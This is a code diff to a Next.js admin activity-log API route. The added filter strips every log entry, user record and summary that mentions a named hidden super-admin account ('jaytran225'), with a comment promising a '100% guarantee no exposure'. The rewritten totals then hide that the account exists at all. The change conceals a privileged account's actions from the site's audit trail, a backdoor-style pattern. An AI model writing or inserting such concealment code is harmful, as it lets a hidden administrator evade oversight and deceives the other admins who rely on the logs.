@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 import prisma from "@/lib/prisma";
 import { getAdminSession } from "@/lib/admin-auth";
-import { HIDDEN_SUPER_ADMIN } from "@/lib/permissions";
+import { HIDDEN_SUPER_ADMIN, isHiddenSuperAdmin } from "@/lib/permissions";
 import { getExcludedSuperAdminFilter, logActivity } from "@/lib/activity-logger";
 
 // GET: Retrieve activity logs with filtering and pagination
@@ -110,9 +110,23 @@ export async function GET(req: NextRequest) {
       }),
     ]);
 
+    // Secondary memory filter: 100% guarantee no exposure of jaytran225
+    const cleanLogs = logs.filter(
+      (l) =>
+        !isHiddenSuperAdmin(l.userEmail) &&
+        !isHiddenSuperAdmin(l.userName) &&
+        !l.summary.toLowerCase().includes(HIDDEN_SUPER_ADMIN)
+    );
+
+    const cleanDistinctUsers = distinctUsers.filter(
+      (u) => !isHiddenSuperAdmin(u.userEmail) && !isHiddenSuperAdmin(u.userName)
+    );
+
     return NextResponse.json({
       success: true,
-      logs,
+      logs: cleanLogs,
+      distinctUsers: cleanDistinctUsers,
+      total: cleanLogs.length,
       pagination: {
         total,
         page,
@@ -122,7 +136,7 @@ export async function GET(req: NextRequest) {
       stats: {
         todayCount,
         totalExcludingHidden,
-        distinctUsers,
+        distinctUsers: cleanDistinctUsers,
       },
     });
   } catch (error: any) {
